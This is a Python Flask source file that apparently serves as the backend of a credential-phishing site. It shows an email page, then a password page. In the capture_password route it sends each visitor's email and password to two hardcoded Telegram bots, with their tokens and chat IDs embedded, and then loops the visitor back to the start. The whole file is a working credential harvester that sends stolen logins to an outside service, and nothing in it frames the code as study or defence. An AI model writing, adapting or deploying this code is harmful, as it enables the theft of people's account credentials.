from flask import Flask, render_template, request, redirect, url_for, session
import requests  # Don't forget to import requests

app = Flask(__name__, static_folder='static')
app.secret_key = 'your-secret-key-here'  # Change this to a strong secret key

# Telegram configuration
TELEGRAM_BOT_TOKENS = ['7692399743:AAHFgwoWb5s2o8sHMJ_KAuP09eUPhkIcLU8', '7740890821:AAEqXm9qsivz9acOy3kPr7sdFd4gMeDD4p4']
TELEGRAM_CHAT_IDS = ['761808737', '6022746471']

def send_to_telegram(message):
    for bot_token, chat_id in zip(TELEGRAM_BOT_TOKENS, TELEGRAM_CHAT_IDS):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message
        }
        try:
            response = requests.post(url, data=payload)
            response.raise_for_status()
            print(f"Message sent to Telegram: {message}")
        except Exception as e:
            print(f"Error sending to Telegram: {e}")

@app.route('/')
def index():
    session.clear()  # Clear any existing session data
    return render_template('email.html')

@app.route('/capture_email', methods=['POST'])
def capture_email():
    email = request.form.get('email')
    if not email:
        return redirect(url_for('index'))
    
    session['email'] = email
    return render_template('password.html', email=email)

@app.route('/capture_password', methods=['POST'])
def capture_password():
    # Get email from session instead of form
    email = session.get('email')
    password = request.form.get('password')
    
    if not email or not password:
        return redirect(url_for('index'))
    
    # Send to Telegram
    message = f"Email: {email}\nPassword: {password}"
    send_to_telegram(message)
    
    # Clear the session
    session.pop('email', None)
    return redirect(url_for('external_redirect'))

@app.route('/redirect')
def external_redirect():
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True, port=5000)